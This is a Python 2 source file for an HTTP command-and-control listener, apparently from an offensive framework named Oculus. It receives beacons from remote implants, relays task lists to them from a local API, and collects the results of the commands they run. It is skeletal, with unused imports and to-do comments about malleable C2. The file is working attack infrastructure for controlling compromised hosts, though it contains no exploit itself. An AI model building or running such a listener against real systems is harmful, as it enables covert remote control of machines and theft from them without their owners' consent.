import BaseHTTPServer
import SimpleHTTPServer
import SocketServer
import os
import sys
import ssl
import cgi
import re
import time
import json
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
import time
import requests


sys.path.append("../")

############
# WHAT THIS DOES
# http.py is a flexible HTTP c2 handler. It binds to a given port and handles communications to and from remote agents
# The Oculus HTTP c2 Handler is capable of managing communications for multiple and disparate implants without the need for separate ports or infrastructure
# Listeners are standalone an may be invoked directly or externally

class Listener:
    def Start(self, NAME, TYPE, LPORT, LHOST):
        print "[+] Instantiating listener on " + LHOST + ":" + LPORT


    def Stop(self):
        pass

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def _set_headers(self):
      self.send_response(200)
      self.send_header('Content-type', 'text/html')
      self.end_headers()

   def do_GET(self):
       self._set_headers()
       # Recieve beacon
       # !!! Implement Malleable c2 and trap uris !!! this is where management of separate implant comm channels happens

       # Query Oculus API and provide response
       # Oculus should manage tasks and only return new taskings
       # Listener should send agent token in api request
       res = requests.get('http://localhost:29000/api/c2')
       data = res.json()
       tasklist = json.dumps(data)

       # Respond to agent with tasklist
       self.wfile.write(tasklist)

       return

   def do_POST(self):
       self._set_headers()

       # Recieve command response
       self.data_string = self.rfile.read(int(self.headers['Content-Length']))

       self.send_response(200)
       self.end_headers()

       # update = json.loads(self.data_string)

       # !!! Implement Malleable c2 and trap uris !!! this is where management of separate implant comm channels happens

       # Submit Oculus API and provide response
       # Oculus should manage tasks and only return new taskings
       # Listener should send agent token in api request
       res = requests.post('http://localhost:29000/api/c2', data=self.data_string)
       data = res.json()
       tasklist = json.dumps(data)
       # Respond to agent with tasklist
       self.wfile.write(tasklist)

       return

##########################
# Main Execution
##########################
if __name__ == '__main__':
    NAME = sys.argv[1]
    TYPE = sys.argv[2]
    LPORT = int(sys.argv[3])
    LHOST = sys.argv[4]

    print "[+] Instantiating listener on " + LHOST + ":" + str(LPORT)

    # Instantiate new listener
    Handler = ServerHandler
    SocketServer.TCPServer.allow_reuse_address=True
    httpd = SocketServer.TCPServer(("", LPORT), Handler)
    httpd.serve_forever()
